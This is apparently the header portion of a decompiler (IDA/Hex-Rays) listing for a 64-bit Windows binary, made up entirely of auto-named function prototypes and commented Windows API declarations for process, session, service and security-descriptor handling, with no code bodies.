// BOOL __stdcall ConvertStringSecurityDescriptorToSecurityDescriptorW(LPCWSTR StringSecurityDescriptor, DWORD StringSDRevision, PSECURITY_DESCRIPTOR *SecurityDescriptor, PULONG SecurityDescriptorSize);
// BOOL __stdcall ConvertStringSecurityDescriptorToSecurityDescriptorA(LPCSTR StringSecurityDescriptor, DWORD StringSDRevision, PSECURITY_DESCRIPTOR *SecurityDescriptor, PULONG SecurityDescriptorSize);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// BOOL __stdcall Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// BOOL __stdcall Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// __int64 __fastcall EnumProcesses(_QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall CreateEnvironmentBlock(_QWORD, _QWORD, _QWORD); weak
// __int64 DestroyEnvironmentBlock(void); weak
// LONG __stdcall WinVerifyTrust(HWND hwnd, GUID *pgActionID, LPVOID pWVTData);
// __int64 __fastcall WTSEnumerateSessionsW(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall WTSFreeMemory(_QWORD); weak
// __int64 __fastcall WTSQueryUserToken(_QWORD, _QWORD); weak
// __int64 __fastcall WTSFreeMemoryExW(_QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall WTSEnumerateProcessesExW(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD); weak
__int64 __fastcall sub_140086F50(__int64 a1, unsigned int *a2, _DWORD *a3, unsigned __int32 *a4);
__int64 __fastcall sub_140087080(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_1400872F0(__int64 a1, _DWORD *a2, int *a3);
__int64 __fastcall sub_1400873F0(__int64 a1, void *a2, __int64 a3, _BYTE *a4);
void *sub_140087480();
void __fastcall sub_1400874D0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140087850(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400878A0(__int64 a1);
_QWORD *__fastcall sub_140087910(__int64 a1, __int64 a2);
// __int64 __fastcall sub_140087990(_QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall sub_140087AB0(_QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall sub_140087BE0(_QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall sub_140087D00(_QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall sub_140087E10(_QWORD, _QWORD, _QWORD, _QWORD); weak
_QWORD *__fastcall sub_140087F30(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_140087FA0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140088020(__int64 a1, __int64 a2);
__int64 __fastcall sub_140088090(__int64 a1, __int64 a2);
_QWORD *__fastcall sub_140088110(_QWORD *a1);
_QWORD *__fastcall sub_1400881C0(_QWORD *a1, _QWORD *a2, char a3, int a4);
__int64 __fastcall sub_140088280(__int64 a1);
// __int64 __fastcall sub_140088320(__int64); weak
// __int64 sub_140088430(void); weak
// __int64 sub_1400884D0(void); weak
// __int64 sub_140088550(void); weak
// __int64 sub_1400885E0(void); weak
// __int64 sub_140088660(void); weak
__int64 __fastcall sub_140088700(__int64 a1);
signed __int64 __fastcall sub_140088730(__int64 a1);
void __fastcall sub_140088780(__int64 a1);
_DWORD *__fastcall sub_1400887B0(__int64 a1);
__int64 __fastcall sub_1400887F0(__int64 a1);
signed __int64 __fastcall sub_140088820(__int64 a1);
void __fastcall sub_140088880(__int64 a1);
void __fastcall sub_1400888B0(__int64 a1);
void __fastcall sub_140088910(__int64 a1);
void __fastcall sub_140088970(__int64 a1);
void __fastcall sub_1400889D0(__int64 a1);
void __fastcall sub_140088A30(__int64 a1);
void __fastcall sub_140088A90(__int64 a1);
__int64 __fastcall sub_140088AF0(__int64 (__fastcall ****a1)(_QWORD, signed __int64));
// __int64 __fastcall sub_140088B10(_QWORD, _QWORD); weak
void __fastcall sub_140088C20(__int64 a1);
_QWORD *__fastcall sub_140088C78(__int64 a1, char a2);
void *__fastcall sub_140088C84(__int64 a1, char a2);
void *__fastcall sub_140088C90(__int64 a1, char a2);
_QWORD *__fastcall sub_140088C9C(__int64 a1, char a2);
void *__fastcall sub_140088CA8(__int64 a1, char a2);
void *__fastcall sub_140088CB4(__int64 a1, char a2);
void *__fastcall sub_140088CC0(__int64 a1, char a2);
void *__fastcall sub_140088CCC(__int64 a1, char a2);
void *__fastcall sub_140088CD8(__int64 a1, char a2);
void *__fastcall sub_140088CE4(__int64 a1, char a2);
void *__fastcall sub_140088CF0(__int64 a1, char a2);
void *__fastcall sub_140088CFC(__int64 a1, char a2);
_QWORD *__fastcall sub_140088D10(void *a1, char a2);
void *__fastcall sub_140088D80(void *a1, char a2);
void *__fastcall sub_140088DD0(void *a1, char a2);
_QWORD *__fastcall sub_140088E20(void *a1, char a2);
void *__fastcall sub_140088E90(void *a1, char a2);
void *__fastcall sub_140088EC0(void *a1, char a2);
void *__fastcall sub_140088EF0(void *a1, char a2);
void *__fastcall sub_140088F20(void *a1, char a2);
void *__fastcall sub_140088F50(void *a1, char a2);
void *__fastcall sub_140088F80(void *a1, char a2);
void *__fastcall sub_140089010(void *a1, char a2);
void *__fastcall sub_140089030(void *a1, char a2);
__int64 __fastcall sub_1400890B0(__int64 a1);
_QWORD *__fastcall sub_1400890E0(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_1400891A0(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_140089260(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_140089320(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_140089350(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_140089380(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_1400893B0(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_1400893E0(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_140089410(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_140089440(__int64 a1, _QWORD *a2);
void __fastcall __noreturn sub_140089500(__int64 a1);
__int64 __fastcall sub_140089520(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
signed __int64 __fastcall sub_140089550(__int64 a1);
signed __int64 __fastcall sub_1400895C0(__int64 a1);
signed __int64 __fastcall sub_140089650(__int64 a1);
signed __int64 __fastcall sub_1400896E0(__int64 a1);
_QWORD *__fastcall sub_140089770(__int64 a1);
char __fastcall sub_1400897C0(char *a1, __int64 a2, __int64 a3, void *a4);
signed __int64 sub_14008A480();
signed __int64 sub_14008A490();
_QWORD *__fastcall sub_14008A4A0(__int64 a1, _QWORD *a2);
__int64 sub_14008A4C0();
__int64 __fastcall sub_14008A4D0(__int64 a1);
_QWORD *__fastcall sub_14008A500(void *Src);
_QWORD *__fastcall sub_14008A6D0(void *Src);
_QWORD *__fastcall sub_14008A8A0(void *Src);
_QWORD *__fastcall sub_14008AA40(void *Src);
_QWORD *__fastcall sub_14008AC70(void *Src);
_QWORD *__fastcall sub_14008AE10(void *Src);
_QWORD *__fastcall sub_14008AFC0(void *Src);
_QWORD *__fastcall sub_14008B190(void *Src);
__int64 __fastcall sub_14008B360(__int64 a1);
unsigned __int64 __fastcall sub_14008B370(__int64 a1, unsigned __int64 a2);
__int64 __fastcall sub_14008B380(__int64 a1, __int64 a2);
char __fastcall sub_14008B3B0(__int64 a1);
__int64 __fastcall sub_14008B3E4(__int64 a1);
__int64 __fastcall sub_14008B3F0(__int64 a1, __int64 a2);
signed __int64 sub_14008B470();
__int64 __fastcall sub_14008B480(__int64 a1, __int64 a2);
__int64 __fastcall sub_14008B500(__int64 a1);
signed __int64 __fastcall sub_14008B590(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14008B610(__int64 a1);
// __int64 __fastcall sub_14008B630(_QWORD); weak
__int64 __fastcall sub_14008B6C0(__int64 a1);
__int64 __fastcall sub_14008B6D0(__int64 a1);
_QWORD *__fastcall sub_14008B730(_QWORD *a1);
_QWORD *__fastcall sub_14008B840(_QWORD *a1);
_QWORD *__fastcall sub_14008B950(_QWORD *a1);
_QWORD *__fastcall sub_14008BA60(_QWORD *a1);
_QWORD *__fastcall sub_14008BB70(_QWORD *a1);
_QWORD *__fastcall sub_14008BC80(_QWORD *a1);
_QWORD *__fastcall sub_14008BEC0(void *Dst);
_QWORD *__fastcall sub_14008BF80(_QWORD *a1);
_QWORD *__fastcall sub_14008BFC0(void *Dst);
_QWORD *__fastcall sub_14008C080(void *Dst);
__int64 sub_14008C140();
__int64 __fastcall sub_14008C1F0(unsigned __int8 *a1, unsigned int a2, unsigned int a3);
__int64 __fastcall sub_14008C270(_BYTE *a1, unsigned int a2, _QWORD *a3, _DWORD *a4);
__int64 __fastcall sub_14008C350(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7, _BYTE *a8, unsigned __int64 a9);
__int64 __fastcall sub_14008C400(__int64 a1, unsigned __int8 *a2, __int64 a3);
signed __int64 *__fastcall sub_14008C4E0(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14008C650(__int64 a1, __int64 a2);
__int64 __fastcall sub_14008C750(__int64 a1, __int64 a2, const char *a3, __int64 a4, _QWORD *a5, __int64 a6);
void *__fastcall sub_14008C9F0(__int64 a1, void *a2, __int64 a3);
signed __int64 *__fastcall sub_14008CA70(__int64 a1, __int64 a2);
__int64 *__fastcall sub_14008CB50(__int64 *a1);
__int64 __fastcall sub_14008CD10(__int64 a1, __int64 a2);
void __fastcall sub_14008CDB0(__int64 a1, __int64 a2);
void **__fastcall sub_14008CE50(__int64 a1, void **a2);
signed __int64 __fastcall sub_14008CE80(__int64 a1);
__int64 __fastcall sub_14008CE90(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_14008CF40(); // weak
__int64 __fastcall sub_14008CF50(__int64 a1, __int64 a2);
bool __fastcall sub_14008CF60(__int64 a1);
void **__fastcall sub_14008CFF0(void **a1);
void **__fastcall sub_14008D040(void **a1);
void **__fastcall sub_14008D090(void **a1);
void **__fastcall sub_14008D0E0(void **a1);
__int64 __fastcall sub_14008D130(__int64 a1, _DWORD *a2, int *a3, int *a4);
__int64 __fastcall sub_14008DBE0(unsigned int a1, unsigned int a2);
__int64 __fastcall sub_14008E1C0(unsigned int a1, __int64 a2, int a3);
__int64 __fastcall sub_14008E340(__int64 a1);
__int64 __fastcall sub_14008E370(__int64 a1, _DWORD *a2, int *a3, int *a4);
// __int64 __fastcall sub_14008EC20(_QWORD, _QWORD, _QWORD, _QWORD); weak
__int64 __fastcall sub_14008F160(__int64 a1, __int64 a2, unsigned int a3);
void __fastcall sub_14008F180(__int64 a1, unsigned __int64 a2);
__int64 __fastcall sub_14008F210(__int64 a1, unsigned int *a2, unsigned int *a3, unsigned __int32 *a4);
unsigned __int64 __fastcall sub_14008FC00(__int64 a1, unsigned int *a2, unsigned int a3);
void __fastcall sub_140090A70(__int64 a1);
__int64 __fastcall sub_140090AB0(__int64 a1);
_QWORD *__fastcall sub_140090AE0(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_140090BA0(void *Src);
__int64 __fastcall sub_140090D50(__int64 a1, __int64 a2, unsigned __int64 a3);
__int64 __fastcall sub_140090DB0(__int64 a1, _DWORD *a2, unsigned __int64 a3);
std::exception *__fastcall sub_140090E60(std::exception *a1, const struct std::exception *a2);
_DWORD *__fastcall sub_140090EE0(_DWORD *a1);
// __int64 __fastcall Concurrency::details::ThreadScheduler::ThreadScheduler(Concurrency::details::ThreadScheduler *__hidden this, const struct Concurrency::SchedulerPolicy *); idb
_DWORD *__fastcall sub_140091020(_DWORD *a1);
_DWORD *__fastcall sub_140091100(_DWORD *a1);
_DWORD *__fastcall sub_1400911E0(_DWORD *a1);
__int64 __fastcall sub_1400912C0(_QWORD *a1);
// __int64 sub_140091330(void); weak
void __fastcall sub_1400913B0(_QWORD *a1);
__int64 __fastcall sub_140091470(__int64 a1);
signed __int64 sub_140091480();
signed __int64 sub_140091490();
__int64 __fastcall sub_1400914A0(__int64 a1, __int64 a2, __int64 a3);
void __fastcall sub_140091510(__int64 a1);
__int64 __fastcall sub_140091670(__int64 a1);
void __fastcall sub_1400918F0(__int64 a1, int a2);
__int64 __fastcall sub_140091900(_QWORD *a1);
__int64 __fastcall sub_140091970(__int64 a1, _BYTE *a2, unsigned __int64 a3);
__int64 __fastcall sub_1400919E0(__int64 a1, unsigned __int8 *a2, __int64 a3);
_DWORD *__fastcall sub_140091B00(_DWORD *a1);
// __int64 __fastcall sub_140091BE0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD); weak
std::exception *__fastcall sub_140091C60(std::exception *a1, const struct std::exception *a2);
_DWORD *__fastcall sub_140091C90(_DWORD *a1);
_DWORD *__fastcall sub_140091D70(_DWORD *a1);
_DWORD *__fastcall sub_140091E50(_DWORD *a1);
__int64 __fastcall sub_140091F30(__int64 a1);
void *__fastcall sub_140091F54(__int64 a1, char a2);
void *__fastcall sub_140091F60(void *a1, char a2);
signed __int64 sub_140091FA0();
__int64 __fastcall sub_140091FB0(__int64 a1, __int64 a2, __int64 a3);
char *__fastcall sub_140092010(__int64 a1);
__int64 __fastcall sub_1400920F0(__int64 a1);
void __fastcall sub_140092240(__int64 a1, __int64 a2);
signed __int64 __fastcall sub_1400922F0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140092490(unsigned int *a1, unsigned int *a2, __int64 *a3);
void __fastcall sub_140092790(unsigned int *a1, unsigned int *a2, signed __int64 a3, unsigned __int8 a4);
unsigned __int64 __fastcall sub_140092950(__int64 a1, __int64 a2);
unsigned int **__fastcall sub_140092B00(unsigned int **a1, unsigned int *a2, unsigned int *a3);
__int64 __fastcall sub_140092D70(__int64 a1, __int64 a2);
__int64 __fastcall sub_140092DA0(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_140092DE0(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140092E20(__int64 a1, __int64 a2, __int64 a3);
std::exception *__fastcall sub_140092E60(std::exception *a1, const struct std::exception *a2);
_DWORD *__fastcall sub_140092EE0(_DWORD *a1);
__int64 __fastcall sub_140092FB0(__int64 a1, __int64 a2, char a3, int a4);
_DWORD *__fastcall sub_140093100(_DWORD *a1);
_DWORD *__fastcall sub_1400931E0(_DWORD *a1);
__int64 __fastcall sub_1400932C0(__int64 a1);
void __fastcall sub_1400932F0(__int64 a1);
void __fastcall sub_140093330(_QWORD **a1);
unsigned int *sub_1400933B0();
unsigned int *sub_140093450();
signed __int64 __fastcall sub_1400935A0(unsigned __int64 a1);
signed __int64 __fastcall sub_140093690(unsigned __int64 a1);
__int64 __fastcall sub_140093780(__int64 a1, unsigned int a2, _DWORD *a3);
char __fastcall sub_1400938F0(unsigned int *a1, unsigned int *a2, _DWORD *a3);
__int64 __fastcall sub_140093980(__int64 a1);
__int64 __fastcall sub_140093E00(__int64 a1);
char __fastcall sub_140094570(_DWORD *a1, unsigned int a2);
__int64 __fastcall sub_1400945D0(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_140094720(_DWORD *a1, unsigned int a2);
void __fastcall sub_140094790(unsigned int *a1, unsigned int *a2, unsigned int a3);
char __fastcall sub_140095060(_QWORD *a1, char a2, char a3);
_QWORD *__fastcall sub_1400951D0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140095230(_QWORD *a1, char a2);
__int64 __fastcall sub_1400952A0(__int64 a1, unsigned int a2, unsigned int a3);
void *__fastcall sub_140095490(__int64 a1, char *a2, size_t a3);
__int64 __fastcall sub_140095570(__int64 a1, __int64 a2, __int64 a3);
char __fastcall sub_1400955B0(_QWORD *a1, char a2);
__int64 __fastcall nullsub_1(_QWORD); // weak
// __int64 __fastcall sub_140095930(_QWORD); weak
// __int64 __fastcall sub_1400959D0(_QWORD); weak
unsigned __int64 __fastcall sub_140095A70(_QWORD *a1, unsigned __int64 a2);
unsigned __int64 __fastcall sub_140095AD0(_QWORD *a1, unsigned __int64 a2);
signed __int64 __fastcall sub_140095B30(__int64 *a1, unsigned __int64 a2);
signed __int64 __fastcall sub_140095C30(__int64 *a1, unsigned __int64 a2);
__int64 __fastcall sub_140095D30(__int64 *a1, unsigned __int64 a2);
unsigned __int64 __fastcall sub_140095DD0(__int64 *a1, unsigned __int64 a2);
unsigned __int64 __fastcall sub_140095F10(__int64 a1, unsigned __int64 a2);
__int64 sub_14009608D(void); // weak
// void __usercall __noreturn sub_1400960D2(__int64 a1@<rbp>);
__int64 sub_14009611D(void); // weak
// void __usercall __noreturn sub_14009616E(__int64 a1@<rbp>);
// void __usercall sub_1400965DD(__int64 a1@<rbp>);
// void __usercall sub_14009660D(__int64 a1@<rbp>);
// void __usercall sub_14009663D(__int64 a1@<rbp>);
// void __usercall sub_14009666D(__int64 a1@<rbp>);
// void __usercall sub_14009669D(__int64 a1@<rbp>);
// void __usercall sub_1400966CD(__int64 a1@<rbp>);
// void __usercall sub_1400966FD(__int64 a1@<rbp>);
// void __usercall sub_14009671D(__int64 a1@<rbp>);
// void __usercall sub_140096C3D(__int64 a1@<rbp>);
// void __usercall sub_140096C5D(__int64 a1@<rbp>);
// void __usercall __noreturn sub_140096C7D(__int64 a1@<rbp>);
// void __usercall __noreturn sub_140096CAD(__int64 a1@<rbp>);
// void __usercall sub_140096D0D(__int64 a1@<rbp>);
// void __usercall sub_140096D2D(__int64 a1@<rbp>);
// void __usercall sub_140096E1D(__int64 a1@<rbp>);
// void __usercall sub_140096E4D(__int64 a1@<rbp>);
// void __usercall sub_140096E7D(__int64 a1@<rbp>);
// void __usercall sub_140096EAD(__int64 a1@<rbp>);
// void __usercall sub_140096EDD(__int64 a1@<rbp>);
// void __usercall sub_140096F0D(__int64 a1@<rbp>);
// void __usercall sub_140096F3D(__int64 a1@<rbp>);
// void __usercall sub_140096F6D(__int64 a1@<rbp>);
// void __usercall sub_140096F9D(__int64 a1@<rbp>);
// void __usercall __noreturn sub_140096FE9(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009700E(__int64 a1@<rbp>);
// void __usercall sub_1400975CD(__int64 a1@<rbp>);
// void __usercall sub_1400975ED(__int64 a1@<rbp>);
__int64 sub_140097747(void); // weak
void sub_14009778D();
// void __usercall sub_1400977AD(__int64 a1@<rbp>);
// void __usercall sub_14009781D(__int64 a1@<rbp>);
// void __usercall sub_14009783D(__int64 a1@<rbp>);
// void __usercall sub_14009785E(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009789D(__int64 a1@<rbp>);
// void __usercall __noreturn sub_1400978CD(__int64 a1@<rbp>);
void __noreturn sub_1400978ED();
void sub_14009790D();
// void __usercall sub_14009792F(__int64 a1@<rbp>);
// void __usercall __noreturn sub_140097995(__int64 a1@<rbp>);
// void __usercall sub_140097FDD(__int64 a1@<rbp>);
// void __usercall sub_140097FFD(__int64 a1@<rbp>);
// void __usercall sub_14009801D(__int64 a1@<rbp>);
// void __usercall sub_14009803D(__int64 a1@<rbp>);
// void __usercall sub_14009805D(__int64 a1@<rbp>);
// void __usercall sub_14009808D(__int64 a1@<rbp>);
// void __usercall sub_1400980AD(__int64 a1@<rbp>);
// void __usercall sub_1400980CD(__int64 a1@<rbp>);
// void __usercall sub_1400980ED(__int64 a1@<rbp>);
// void __usercall __noreturn sub_1400982F5(__int64 a1@<rbp>);
// void __usercall __noreturn sub_140098339(__int64 a1@<rbp>);
// void __usercall __noreturn sub_140098379(__int64 a1@<rbp>);
// void __usercall sub_14009839D(__int64 a1@<rbp>);
// void __usercall __noreturn sub_1400983CD(__int64 a1@<rbp>);
// void __usercall __noreturn sub_1400983FD(__int64 a1@<rbp>);
void __noreturn sub_14009842D();
void sub_14009844D();
void sub_14009846D();
// void __usercall sub_14009868D(__int64 a1@<rbp>);
// void __usercall sub_1400986AD(__int64 a1@<rbp>);
// void __usercall sub_1400986ED(__int64 a1@<rbp>);
// void __usercall sub_14009870D(__int64 a1@<rbp>);
// void __usercall sub_14009872D(__int64 a1@<rbp>);
void __noreturn sub_140098750();
// void __usercall sub_14009880D(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009885B(__int64 a1@<rbp>);
// void __usercall sub_140098A6D(__int64 a1@<rbp>);
// void __usercall sub_14009921D(__int64 a1@<rbp>);
// void __usercall __noreturn sub_140099265(__int64 a1@<rbp>);
__int64 sub_1400994DF(void); // weak
// void __usercall sub_1400996DD(__int64 a1@<rbp>);
__int64 sub_140099C27(void); // weak
__int64 sub_140099C77(void); // weak
// void __usercall __noreturn sub_140099FDA(__int64 a1@<rbp>);
// void __usercall sub_14009A49D(__int64 a1@<rbp>);
// void __usercall sub_14009AD0D(__int64 a1@<rbp>);
// void __usercall sub_14009AD2D(__int64 a1@<rbp>);
// void __usercall sub_14009AE70(_QWORD *a1@<rbp>);
// void __usercall __noreturn sub_14009AECB(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009AF2B(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009AF98(_QWORD *a1@<rbp>);
// void __usercall __noreturn sub_14009B008(_QWORD *a1@<rbp>);
// void __usercall __noreturn sub_14009B06B(__int64 a1@<rbp>);
// void __usercall sub_14009B0BD(__int64 a1@<rbp>);
// void __usercall sub_14009B0DD(__int64 a1@<rbp>);
// void __usercall sub_14009B54D(__int64 a1@<rbp>);
// void __usercall sub_14009B56D(__int64 a1@<rbp>);
// void __usercall sub_14009B58D(__int64 a1@<rbp>);
// void __usercall sub_14009B60D(__int64 a1@<rbp>);
// void __usercall sub_14009B62D(__int64 a1@<rbp>);
// void __usercall sub_14009CA8D(__int64 a1@<rbp>);
// void __usercall sub_14009CAAD(__int64 a1@<rbp>);
// void __usercall sub_14009CACD(__int64 a1@<rbp>);
// void __usercall sub_14009CAED(__int64 a1@<rbp>);
// void __usercall sub_14009CC0D(__int64 a1@<rbp>);
// void __usercall sub_14009CD6D(__int64 a1@<rbp>);
// void __usercall sub_14009CD8D(__int64 a1@<rbp>);
// void __usercall sub_14009CDAD(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009CDF3(__int64 a1@<rbp>);
// void __usercall sub_14009CE3D(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009CE83(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009CF45(__int64 a1@<rbp>);
// void __usercall sub_14009CF6D(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009CF9D(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009CFCD(__int64 a1@<rbp>);
// void __usercall sub_14009D000(_QWORD *a1@<rbp>);
// void __usercall __noreturn sub_14009D069(__int64 a1@<rbp>);
// void __usercall sub_14009D1DD(__int64 a1@<rbp>);
// void __usercall sub_14009D1FD(__int64 a1@<rbp>);
// void __usercall sub_14009D22D(__int64 a1@<rbp>);
// void __usercall sub_14009DBBE(__int64 a1@<rbp>);
// void __usercall sub_14009DC0D(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009DC9F(_QWORD *a1@<rbp>);
// void __usercall sub_14009DCF0(_QWORD *a1@<rbp>);
// void __usercall sub_14009DDFD(__int64 a1@<rbp>);
// void __usercall sub_14009DE1D(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009DF19(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009DF65(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009DFC5(__int64 a1@<rbp>);
// void __usercall sub_14009E1ED(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009E20D(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009E23D(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009E285(__int64 a1@<rbp>);
// void __usercall sub_14009E4AD(__int64 a1@<rbp>);
// void __usercall sub_14009E4CD(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009E7E9(__int64 a1@<rbp>);
// void __usercall sub_14009E86D(__int64 a1@<rbp>);
// void __usercall sub_14009E91D(__int64 a1@<rbp>);
// void __usercall sub_14009E97E(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009EAB9(__int64 a1@<rbp>);
// void __usercall sub_14009EADD(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009EB19(__int64 a1@<rbp>);
// void __usercall __noreturn sub_14009EC8B(__int64 a1@<rbp>);
// void __usercall sub_14009EEAD(__int64 a1@<rbp>);
void sub_14009F79D();
void sub_14009F7BD();
void sub_14009F7DD();
void sub_14009F7FD();
// void __usercall __noreturn sub_14009F8D5(__int64 a1@<rbp>);
// void __usercall sub_14009FACE(__int64 a1@<rbp>);
// void __usercall sub_14009FB0E(__int64 a1@<rbp>);
// void __usercall sub_14009FB4D(__int64 a1@<rbp>);
// void __usercall sub_14009FB6D(__int64 a1@<rbp>);
void *sub_14009FB80();
__int64 sub_14009FBB0();
void __cdecl sub_14009FBF0(); // idb
void sub_14009FC00();
void __cdecl sub_14009FC20(); // idb
void __cdecl sub_14009FC60(); // idb
void __cdecl sub_14009FCA0(); // idb
void __cdecl sub_14009FCE0(); // idb
void __cdecl sub_14009FD20(); // idb
void __cdecl sub_14009FD40(); // idb
void __cdecl sub_14009FD80(); // idb
void __cdecl sub_14009FD90(); // idb
void __cdecl sub_14009FDA0(); // idb
void __cdecl sub_14009FE10(); // idb
void __cdecl sub_14009FE80(); // idb
void __cdecl sub_14009FEF0(); // idb
__int64 sub_14009FF30();
void __cdecl sub_14009FF70(); // idb
void __cdecl sub_14009FF80(); // idb
void sub_14009FFF0();
void __cdecl sub_1400A0060(); // idb
void __cdecl sub_1400A0070(); // idb
void __cdecl sub_1400A0080(); // idb
void __cdecl sub_1400A00B0(); // idb
void __cdecl sub_1400A00E0(); // idb
void __cdecl sub_1400A0110(); // idb
void __cdecl sub_1400A0140(); // idb
void __cdecl sub_1400A0180(); // idb
void __cdecl sub_1400A01F0(); // idb
void sub_1400A0220();
void __cdecl sub_1400A0230(); // idb
void sub_1400A02A0();
void __cdecl sub_1400A02B0(); // idb
// __int64 __fastcall unknown_libname_116(); weak
void __cdecl sub_1400A04A0(); // idb
void __cdecl sub_1400A0530(); // idb
void __cdecl sub_1400A0560(); // idb
void __cdecl sub_1400A05A0(); // idb
// BOOL __stdcall ChangeServiceConfig2W(SC_HANDLE hService, DWORD dwInfoLevel, LPVOID lpInfo);
// BOOL __stdcall CloseServiceHandle(SC_HANDLE hSCObject);
// SC_HANDLE __stdcall CreateServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies, LPCSTR lpServiceStartName, LPCSTR lpPassword);
// BOOL __stdcall DeleteService(SC_HANDLE hService);
// SC_HANDLE __stdcall OpenSCManagerW(LPCWSTR lpMachineName, LPCWSTR lpDatabaseName, DWORD dwDesiredAccess);
// SC_HANDLE __stdcall OpenServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
// BOOL __stdcall QueryServiceStatus(SC_HANDLE hService, LPSERVICE_STATUS lpServiceStatus);
// BOOL __stdcall GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// BOOL __stdcall EqualSid(PSID pSid1, PSID pSid2);
// DWORD __stdcall SetSecurityInfo(HANDLE handle, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID psidOwner, PSID psidGroup, PACL pDacl, PACL pSacl);
// DWORD __stdcall SetNamedSecurityInfoA(LPSTR pObjectName, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID psidOwner, PSID psidGroup, PACL pDacl, PACL pSacl);
// DWORD __stdcall SetEntriesInAclW(ULONG cCountOfExplicitEntries, PEXPLICIT_ACCESS_W pListOfExplicitEntries, PACL OldAcl, PACL *NewAcl);
// BOOL __stdcall GetSecurityDescriptorSacl(PSECURITY_DESCRIPTOR pSecurityDescriptor, LPBOOL lpbSaclPresent, PACL *pSacl, LPBOOL lpbSaclDefaulted);
// BOOL __stdcall CryptGenRandom(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);
// BOOL __stdcall CryptReleaseContext(HCRYPTPROV hProv, DWORD dwFlags);
// BOOL __stdcall CryptAcquireContextW(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// LSTATUS __stdcall RegSetKeySecurity(HKEY hKey, SECURITY_INFORMATION SecurityInformation, PSECURITY_DESCRIPTOR pSecurityDescriptor);
// BOOL __stdcall InitializeAcl(PACL pAcl, DWORD nAclLength, DWORD dwAclRevision);
// DWORD __stdcall GetLengthSid(PSID pSid);
// PVOID __stdcall FreeSid(PSID pSid);
// BOOL __stdcall AllocateAndInitializeSid(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD nSubAuthority0, DWORD nSubAuthority1, DWORD nSubAuthority2, DWORD nSubAuthority3, DWORD nSubAuthority4, DWORD nSubAuthority5, DWORD nSubAuthority6, DWORD nSubAuthority7, PSID *pSid);
// BOOL __stdcall AddAccessAllowedAce(PACL pAcl, DWORD dwAceRevision, DWORD AccessMask, PSID pSid);
// BOOL __stdcall SetSecurityDescriptorDacl(PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bDaclPresent, PACL pDacl, BOOL bDaclDefaulted);
